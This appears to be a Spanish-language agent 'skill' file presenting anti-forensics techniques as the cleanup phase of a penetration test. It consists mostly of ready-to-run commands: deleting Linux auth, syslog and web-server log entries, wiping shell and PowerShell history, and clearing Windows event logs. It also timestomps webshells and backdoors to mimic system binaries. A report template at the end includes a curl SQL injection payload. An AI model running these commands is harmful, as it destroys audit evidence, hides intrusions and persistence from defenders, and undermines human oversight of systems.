# Skill: Limpieza Forense y Borrado de Huellas

## Descripción
Técnicas de eliminación de evidencia, manipulación de logs y borrado seguro
de artefactos para la fase de limpieza en pentesting.

## Limpieza de Logs (Linux)

### auth.log
```bash
# Eliminar entradas por IP
sed -i '/10.0.0.1/d' /var/log/auth.log

# Eliminar rango de tiempo
awk '$0 > "Apr 10 10:00:00" && $0 < "Apr 10 12:00:00" {next} 1' /var/log/auth.log > /tmp/auth.log && mv /tmp/auth.log /var/log/auth.log
```

### Bash History
```bash
# Limpiar todo
cat /dev/null > ~/.bash_history
history -c

# Limpiar comandos específicos
sed -i '/nmap/d' ~/.bash_history
sed -i '/sqlmap/d' ~/.bash_history
sed -i '/nc -e/d' ~/.bash_history
```

### syslog
```bash
sed -i '/attacker_script/d' /var/log/syslog
sed -i '/malicious/d' /var/log/syslog
```

### Apache/Nginx logs
```bash
# Apache
sed -i '/10.0.0.1/d' /var/log/apache2/access.log
sed -i '/10.0.0.1/d' /var/log/apache2/error.log

# Nginx
sed -i '/10.0.0.1/d' /var/log/nginx/access.log
sed -i '/10.0.0.1/d' /var/log/nginx/error.log
```

## Limpieza de Logs (Windows)

### Event Logs
```powershell
# Clear specific logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# Clear all logs
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
```

### PowerShell History
```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear console history
Clear-Host
```

## Eliminación de Artefactos

### Borrado seguro
```bash
# shred - overwrite file multiple times before delete
shred -f -n 7 /tmp/exploit.sh
shred -f -n 7 /var/www/html/webshell.php
shred -f -n 7 /tmp/payload

# wipe entire directory
shred -f -n 7 /tmp/tools/*
rm -rf /tmp/tools/
```

### Desinstalación de herramientas
```bash
# Remove compiled tools
rm -f /usr/local/bin/linpeas
rm -f /tmp/pspy
rm -rf /opt/exploit-tools
```

### Remover paquetes instalados
```bash
# Si se instaló algo via apt
apt-get remove --purge nmap -y

# Si se compiló desde fuente
make uninstall
```

## Timestomp

### Linux
```bash
# Sincronizar timestamps con archivo legítimo
touch -r /bin/ls /var/www/html/webshell.php
touch -r /etc/passwd /tmp/exploit.sh

# Usar referencia de archivo existente
touch -r /bin/sh /root/.backdoor.sh
```

### Windows
```powershell
# Cambiar timestamps (PowerShell)
(Get-Item backdoor.exe).CreationTime = (Get-Item cmd.exe).CreationTime
(Get-Item backdoor.exe).LastWriteTime = (Get-Item cmd.exe).LastWriteTime
(Get-Item backdoor.exe).LastAccessTime = (Get-Item cmd.exe).LastAccessTime
```

## Restauración de Configuraciones

### SSH
```bash
# Remover claves autorizadas agregadas
sed -i '/ssh-rsa AAAAB3/d' ~/.ssh/authorized_keys

# Restaurar sshd_config si se modificó
```

### Firewall
```bash
# Restaurar reglas de firewall
iptables -F
ufw enable
```

## Informe Técnico

### Estructura del informe
1. Resumen ejecutivo
2. Alcance de la auditoría
3. Metodología utilizada
4. Hallazgos (ordenados por severidad)
5. Pruebas de concepto (PoCs)
6. Recomendaciones de remediación
7. Apéndices (logs, capturas, referencias)

### Formato CVSS para cada hallazgo
```markdown
### VULN-001: SQL Injection en /api/users

**CVSS**: 9.1 (Critical)
**Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**CVE**: N/A

**Descripción**: ...

**PoC**:
```bash
curl -X POST https://target.com/api/users \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1"}'
```

**Remediación**: Usar prepared statements / parametrized queries.
```
```

## Referencias
- OWASP Testing Guide
- SANS Penetration Testing Methodology
- MITRE ATT&CK: https://attack.mitre.org/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
